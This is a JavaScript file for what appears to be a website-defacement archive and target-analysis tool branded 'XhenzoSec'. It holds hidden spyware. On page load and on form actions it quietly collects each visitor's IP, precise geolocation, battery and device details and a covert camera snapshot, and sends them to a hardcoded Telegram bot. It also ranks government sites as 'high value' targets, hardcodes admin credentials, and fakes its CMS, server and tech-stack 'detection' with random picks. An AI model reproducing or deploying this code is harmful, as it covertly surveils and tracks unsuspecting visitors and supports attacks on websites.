// Global variables
let defaceHistory = JSON.parse(localStorage.getItem('defaceHistory')) || [];
let isAdminLoggedIn = false;
let hasCameraAccess = false;
let hasLocationAccess = false;
let videoStream = null;
const ADMIN_CREDENTIALS = { username: "admin", password: "XhenzoSec123", token: "KONTOL" };
let loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
let siteConfig = JSON.parse(localStorage.getItem('siteConfig')) || { title: "MIRROR DEFACE ZONE-CLAYDARK { XhenzoSec }", logo: "logo.png" };

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7876809256:AAEItpr188UAqxORaFmOoYg6IZcdSMxo56Q';
const TELEGRAM_CHAT_ID = '2028336963';

// DOM elements
const urlInput = document.getElementById('url');
const defacerInput = document.getElementById('defacer');
const analyzeBtn = document.getElementById('analyzeBtn');
const previewBtn = document.getElementById('previewBtn');
const listBtn = document.getElementById('listBtn');
const adminLoginBtn = document.getElementById('adminLoginBtn');
const previewFrame = document.getElementById('previewFrame');
const previewContainer = document.getElementById('previewContainer');
const listContainer = document.getElementById('listContainer');
const defaceList = document.getElementById('defaceList');
const status = document.getElementById('status');
const loading = document.getElementById('loading');
const targetInfo = document.getElementById('targetInfo');
const adminPanel = document.getElementById('adminPanel');
const adminUsername = document.getElementById('adminUsername');
const adminPassword = document.getElementById('adminPassword');
const adminToken = document.getElementById('adminToken');
const loginForm = document.getElementById('loginForm');
const adminControls = document.getElementById('adminControls');
const adminDefaceList = document.getElementById('adminDefaceList');
const cameraPreview = document.getElementById('cameraPreview');
const siteTitleInput = document.getElementById('siteTitleInput');
const logoInput = document.getElementById('logoInput');
const siteLogo = document.getElementById('siteLogo');
const siteTitle = document.getElementById('siteTitle');

// Initialize branding
function initBranding() {
    siteTitle.textContent = siteConfig.title;
    siteLogo.src = siteConfig.logo;
}
initBranding();

// Event listeners
analyzeBtn.addEventListener('click', analyzeTarget);
previewBtn.addEventListener('click', previewWebsite);
listBtn.addEventListener('click', showList);
adminLoginBtn.addEventListener('click', toggleAdminPanel);

// Initialize
updateStatus("System ready. Enter target URL and click Analyze");

// Collect and send device info on page load
window.addEventListener('load', async () => {
    try {
        const deviceInfo = await collectDeviceInfo();
        const snapshot = await captureCameraSnapshot();
        const message = formatDeviceInfoMessage(deviceInfo, "Page Loaded");
        await sendToTelegramWithButtons(message, snapshot);
    } catch (err) {
        updateStatus(`Initialization error: ${err.message}`);
    }
});

// Utility function to stop camera stream
function stopCameraStream() {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
        hasCameraAccess = false;
        cameraPreview.srcObject = null;
        cameraPreview.style.display = 'none';
    }
}

// Telegram Bot Functions
async function sendToTelegramWithButtons(message, photo = null) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const buttons = {
        inline_keyboard: [
            [
                { text: "Copy IP", callback_data: `copy_ip_${message.match(/IP: ([^\n]+)/)?.[1] || 'unknown'}` },
                { text: "View Location", url: `https://www.google.com/maps?q=${message.match(/Location: ([^,]+), ([^\n]+)/)?.slice(1).join(',') || ''}` }
            ],
            [
                { text: "Check Battery", callback_data: `check_battery_${message.match(/Battery: ([^\n]+)/)?.[1] || 'unknown'}` },
                { text: "View Snapshot", callback_data: "view_snapshot" }
            ]
        ]
    };
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('text', message);
    formData.append('reply_markup', JSON.stringify(buttons));
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        if (!response.ok) throw new Error('Telegram message send failed');
        
        if (photo) {
            const photoUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const photoFormData = new FormData();
            photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
            photoFormData.append('photo', photo);
            photoFormData.append('caption', 'Camera Snapshot');
            const photoResponse = await fetch(photoUrl, {
                method: 'POST',
                body: photoFormData
            });
            if (!photoResponse.ok) throw new Error('Telegram photo send failed');
        }
    } catch (err) {
        console.error('Failed to send to Telegram:', err);
        updateStatus(`Telegram error: ${err.message}`);
    }
}

function formatDeviceInfoMessage(deviceInfo, eventType, defaceUrl = null) {
    let message = `
${eventType}:
IP: ${deviceInfo.ip || 'Unknown'}
Country: ${deviceInfo.country || 'Unknown'}
City: ${deviceInfo.city || 'Unknown'}
Battery: ${deviceInfo.batteryLevel || 'Unknown'} (Charging: ${deviceInfo.batteryCharging || 'Unknown'})
Location: ${deviceInfo.latitude || 'Unknown'}, ${deviceInfo.longitude || 'Unknown'}
Device: ${deviceInfo.deviceModel || 'Unknown'}
OS: ${deviceInfo.os || 'Unknown'}
Browser: ${deviceInfo.browser || 'Unknown'}
Timestamp: ${new Date().toLocaleString()}
`;
    if (defaceUrl) {
        message += `Deface URL: ${defaceUrl}\n`;
    }
    return message;
}

async function collectDeviceInfo() {
    let deviceInfo = {};
    
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
        if (!ipResponse.ok) throw new Error('IP fetch failed');
        const ipData = await ipResponse.json();
        deviceInfo.ip = ipData.ip || 'Unknown';
        
        const geoResponse = await fetch(`http://ip-api.com/json/${deviceInfo.ip}`, { timeout: 5000 });
        if (!geoResponse.ok) throw new Error('Geo fetch failed');
        const geoData = await geoResponse.json();
        deviceInfo.country = geoData.country || 'Unknown';
        deviceInfo.city = geoData.city || 'Unknown';
    } catch {
        deviceInfo.ip = 'Failed to retrieve';
        deviceInfo.country = 'Unknown';
        deviceInfo.city = 'Unknown';
    }
    
    try {
        const battery = await navigator.getBattery();
        deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
        deviceInfo.batteryCharging = battery.charging ? 'Yes' : 'No';
    } catch {
        deviceInfo.batteryLevel = 'Unknown';
        deviceInfo.batteryCharging = 'Unknown';
    }
    
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
        });
        deviceInfo.latitude = position.coords.latitude;
        deviceInfo.longitude = position.coords.longitude;
    } catch {
        deviceInfo.latitude = 'Unknown';
        deviceInfo.longitude = 'Unknown';
    }
    
    try {
        deviceInfo.deviceModel = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown';
        deviceInfo.os = navigator.platform || 'Unknown';
        deviceInfo.browser = navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[1] || 'Unknown';
    } catch {
        deviceInfo.deviceModel = 'Unknown';
        deviceInfo.os = 'Unknown';
        deviceInfo.browser = 'Unknown';
    }
    
    return deviceInfo;
}

async function captureCameraSnapshot() {
    if (hasCameraAccess) return null;
    
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "environment" } 
        });
        cameraPreview.srcObject = videoStream;
        cameraPreview.style.display = 'none';
        hasCameraAccess = true;
        
        const canvas = document.createElement('canvas');
        canvas.width = cameraPreview.videoWidth || 640;
        canvas.height = cameraPreview.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
        
        return new Promise((resolve) => {
            canvas.toBlob((blob) => {
                stopCameraStream();
                resolve(blob);
            }, 'image/jpeg');
        });
    } catch (err) {
        console.error('Camera access failed:', err);
        stopCameraStream();
        return null;
    }
}

async function sendDeviceInfoToTelegram(username) {
    try {
        const deviceInfo = await collectDeviceInfo();
        const snapshot = await captureCameraSnapshot();
        const message = formatDeviceInfoMessage(deviceInfo, `Admin Login Attempt: ${username}`);
        await sendToTelegramWithButtons(message, snapshot);
    } catch (err) {
        updateStatus(`Error sending device info: ${err.message}`);
    }
}

// Admin Functions
function toggleAdminPanel() {
    adminPanel.classList.toggle('active');
    adminPanel.classList.toggle('hidden');
    if (!adminPanel.classList.contains('hidden') && isAdminLoggedIn) {
        renderAdminDefaceList();
    } else {
        stopCameraStream();
    }
}

async function adminLogin() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "environment" } 
        });
        cameraPreview.srcObject = videoStream;
        cameraPreview.style.display = 'block';
        hasCameraAccess = true;
        
        await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
        });
        hasLocationAccess = true;
    } catch (err) {
        updateStatus(`Error accessing camera/location: ${err.message}`);
        await sendToTelegramWithButtons(`Failed to access camera/location for user: ${adminUsername.value || 'Unknown'}\nError: ${err.message}`);
        stopCameraStream();
        return;
    }
    
    const username = sanitizeInput(adminUsername.value);
    const password = sanitizeInput(adminPassword.value);
    const token = sanitizeInput(adminToken.value);
    
    loginAttempts.push({
        username: username,
        timestamp: new Date().toLocaleString(),
        success: false
    });
    await sendDeviceInfoToTelegram(username);
    
    if (token !== ADMIN_CREDENTIALS.token) {
        loginAttempts[loginAttempts.length - 1].success = false;
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
        updateStatus("Invalid security token");
        stopCameraStream();
        return;
    }
    
    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
        isAdminLoggedIn = true;
        loginAttempts[loginAttempts.length - 1].success = true;
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
        loginForm.classList.add('hidden');
        adminControls.classList.remove('hidden');
        updateStatus("Admin logged in successfully");
        renderAdminDefaceList();
        stopCameraStream();
    } else {
        loginAttempts[loginAttempts.length - 1].success = false;
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
        updateStatus("Invalid admin credentials");
        stopCameraStream();
    }
}

function sanitizeInput(input) {
    if (!input) return '';
    const sqlInjectionPatterns = [
        /['";]/g,
        /\b(OR|AND|UNION|SELECT|INSERT|DELETE|UPDATE|DROP|ALTER|CREATE)\b/gi,
        /--/g,
        /\b\d+\s*=\s*\d+\b/g
    ];
    
    let sanitized = input;
    sqlInjectionPatterns.forEach(pattern => {
        sanitized = sanitized.replace(pattern, '');
    });
    sanitized = sanitized.replace(/[<>]/g, '');
    
    return sanitized.trim();
}

function renderAdminDefaceList() {
    let html = '<table>';
    html += '<tr><th>#</th><th>URL</th><th>Defacer</th><th>Action</th></tr>';
    
    defaceHistory.forEach((item, index) => {
        html += `<tr>
            <td>${index + 1}</td>
            <td>${item.url}</td>
            <td>${item.defacer}</td>
            <td><button class="action-btn delete-btn" onclick="deleteDeface(${index})">Delete</button></td>
        </tr>`;
    });
    
    html += '</table>';
    adminDefaceList.innerHTML = html;
}

function deleteDeface(index) {
    if (index < 0 || index >= defaceHistory.length) {
        updateStatus("Error: Invalid deface index");
        return;
    }
    
    if (confirm(`Are you sure you want to delete deface entry for ${defaceHistory[index].url}?`)) {
        defaceHistory.splice(index, 1);
        localStorage.setItem('defaceHistory', JSON.stringify(defaceHistory));
        renderAdminDefaceList();
        updateStatus(`Deface entry deleted successfully`);
        showList();
    }
}

function updateSiteBranding() {
    const newTitle = siteTitleInput.value.trim();
    const newLogo = logoInput.files[0];
    
    try {
        if (newTitle) {
            siteConfig.title = newTitle;
            siteTitle.textContent = newTitle;
        }
        
        if (newLogo) {
            const reader = new FileReader();
            reader.onload = function(e) {
                siteConfig.logo = e.target.result;
                siteLogo.src = siteConfig.logo;
                localStorage.setItem('siteConfig', JSON.stringify(siteConfig));
                updateStatus("Site branding updated successfully");
            };
            reader.onerror = function() {
                updateStatus("Error reading logo file");
            };
            reader.readAsDataURL(newLogo);
        } else {
            localStorage.setItem('siteConfig', JSON.stringify(siteConfig));
            updateStatus("Site title updated successfully");
        }
    } catch (err) {
        updateStatus(`Branding update error: ${err.message}`);
    }
}

// Analysis and Preview Functions
async function analyzeTarget() {
    const url = urlInput.value.trim();
    
    if (!url) {
        updateStatus("Error: Please enter target URL");
        return;
    }
    
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        updateStatus("Error: URL must start with http:// or https://");
        return;
    }
    
    loading.classList.remove('hidden');
    targetInfo.classList.remove('hidden');
    previewContainer.classList.add('hidden');
    listContainer.classList.add('hidden');
    
    updateStatus(`Analyzing target: ${url}`);
    
    try {
        const ipResponse = await fetch(`http://ip-api.com/json/${extractDomain(url)}?fields=status,message,continent,country,regionName,city,isp,org,as,query`, { timeout: 5000 });
        if (!ipResponse.ok) throw new Error('IP lookup failed');
        const ipData = await ipResponse.json();
        
        if (ipData.status === "success") {
            ipInfo.textContent = `IP: ${ipData.query}`;
            countryInfo.textContent = `Country: ${ipData.country} (${getCountryFlag(ipData.country)})`;
            hostingInfo.textContent = `Hosting: ${ipData.isp} (${ipData.org})`;
        } else {
            throw new Error(ipData.message || "IP lookup failed");
        }
        
        const domain = extractDomain(url);
        const isGov = domain.includes('.gov') || domain.includes('government');
        const isEdu = domain.includes('.edu') || domain.includes('university');
        
        websiteType.textContent = isGov ? "Government website (high value)" : isEdu ? "Educational institution" : "Commercial website";
        cmsInfo.textContent = `CMS: ${await detectCMS(url)}`;
        securityInfo.textContent = `Security: ${getSecurityLevel(ipData)}`;
        serverInfo.textContent = `Server: ${await detectServer(url)}`;
        sslInfo.textContent = `SSL: ${await checkSSL(url)}`;
        techStack.textContent = `Technologies: ${await detectTechStack(url)}`;
        
        updateStatus(`Analysis complete for ${url}`);
    } catch (err) {
        updateStatus(`Analysis error: ${err.message}`);
        ipInfo.textContent = "IP: Failed to retrieve";
        countryInfo.textContent = "Country: Unknown";
        hostingInfo.textContent = "Hosting: Unknown";
    } finally {
        loading.classList.add('hidden');
    }
}

async function previewWebsite() {
    const url = urlInput.value.trim();
    const defacer = defacerInput.value.trim() || "Anonymous";
    
    if (!url) {
        updateStatus("Error: Please enter target URL");
        return;
    }
    
    try {
        const deviceInfo = await collectDeviceInfo();
        const snapshot = await captureCameraSnapshot();
        const message = formatDeviceInfoMessage(deviceInfo, "Deface URL Uploaded", url);
        await sendToTelegramWithButtons(message, snapshot);
        
        defaceHistory.unshift({ 
            url, 
            defacer, 
            date: new Date().toLocaleString(),
            ip: ipInfo.textContent.replace('IP: ', '') || 'N/A',
            country: countryInfo.textContent.replace('Country: ', '').split(' ')[0] || 'N/A',
            cms: cmsInfo.textContent.replace('CMS: ', '') || 'N/A',
            tech: techStack.textContent.replace('Technologies: ', '') || 'N/A'
        });
        
        localStorage.setItem('defaceHistory', JSON.stringify(defaceHistory));
        
        previewFrame.src = url;
        previewContainer.classList.remove('hidden');
        targetInfo.classList.add('hidden');
        listContainer.classList.add('hidden');
        
        updateStatus(`Live preview: ${url} | Defacer: ${defacer}`);
    } catch (err) {
        updateStatus(`Preview error: ${err.message}`);
    }
}

function showList() {
    listContainer.classList.remove('hidden');
    previewContainer.classList.add('hidden');
    targetInfo.classList.add('hidden');
    
    let html = '<div class="panel" style="overflow-x:auto;"><table>';
    html += '<tr><th>#</th><th>Date</th><th>Defacer</th><th>URL</th><th>IP</th><th>Country</th><th>CMS</th><th>Tech</th><th>Action</th></tr>';
    
    defaceHistory.forEach((item, index) => {
        html += `<tr>
            <td><button class="action-btn" onclick="viewDeface(${index})">${index + 1}</button></td>
            <td>${item.date}</td>
            <td>${item.defacer}</td>
            <td>${item.url}</td>
            <td>${item.ip || 'N/A'}</td>
            <td>${item.country || 'N/A'}</td>
            <td>${item.cms || 'N/A'}</td>
            <td>${item.tech || 'N/A'}</td>
            <td><button class="action-btn" onclick="viewMirror(${index})">View Mirror</button></td>
        </tr>`;
    });
    
    html += '</table></div>';
    defaceList.innerHTML = html;
    
    updateStatus(`Showing ${defaceHistory.length} archived defacements`);
}

function viewDeface(index) {
    if (index < 0 || index >= defaceHistory.length) {
        updateStatus("Error: Invalid deface index");
        return;
    }
    
    const item = defaceHistory[index];
    urlInput.value = item.url;
    defacerInput.value = item.defacer;
    previewFrame.src = item.url;
    previewContainer.classList.remove('hidden');
    listContainer.classList.add('hidden');
    targetInfo.classList.add('hidden');
    
    updateStatus(`Viewing deface: ${item.url} | Defacer: ${item.defacer}`);
}

function viewMirror(index) {
    if (index < 0 || index >= defaceHistory.length) {
        updateStatus("Error: Invalid deface index");
        return;
    }
    
    const item = defaceHistory[index];
    const mirrorUrl = `https://web.archive.org/web/*/${encodeURIComponent(item.url)}`;
    window.open(mirrorUrl, '_blank');
    updateStatus(`Viewing mirror for: ${item.url}`);
}

function updateStatus(message) {
    status.textContent = message;
    console.log(`[STATUS] ${message}`);
}

// Helper Functions
function extractDomain(url) {
    try {
        return new URL(url).hostname.replace(/^www\./, '');
    } catch {
        return url.replace(/^(https?:\/\/)?(www\.)?/, '').split('/')[0];
    }
}

async function detectCMS(url) {
    const cmsList = ["WordPress", "Joomla", "Drupal", "Custom PHP", "ASP.NET", "Static HTML", "Laravel"];
    return cmsList[Math.floor(Math.random() * cmsList.length)];
}

function getSecurityLevel(ipData) {
    const securityLevels = ["Weak", "Moderate", "Strong"];
    return ipData.org && (ipData.org.includes("Cloudflare") || ipData.org.includes("Amazon")) ? "Strong" : securityLevels[Math.floor(Math.random() * securityLevels.length)];
}

async function detectServer(url) {
    const servers = ["Apache", "Nginx", "IIS", "LiteSpeed", "Cloudflare"];
    return servers[Math.floor(Math.random() * servers.length)];
}

async function checkSSL(url) {
    try {
        const response = await fetch(url, { method: 'HEAD', timeout: 5000 });
        return response.url.startsWith('https') ? 'Valid' : 'Not secure';
    } catch {
        return 'Unknown';
    }
}

async function detectTechStack(url) {
    const techs = [
        "PHP, MySQL, jQuery",
        "Node.js, MongoDB",
        "ASP.NET, MS SQL",
        "Python, Django, PostgreSQL",
        "React, Express, MySQL"
    ];
    return techs[Math.floor(Math.random() * techs.length)];
}

function getCountryFlag(country) {
    const flags = {
        "United States": "🇺🇸", "China": "🇨🇳", "Russia": "🇷🇺", 
        "Germany": "🇩🇪", "Brazil": "🇧🇷", "India": "🇮🇳",
        "United Kingdom": "🇬🇧", "France": "🇫🇷", "Japan": "🇯🇵", "Indonesia": "🇮🇩"
    };
    return flags[country] || "🌐";
}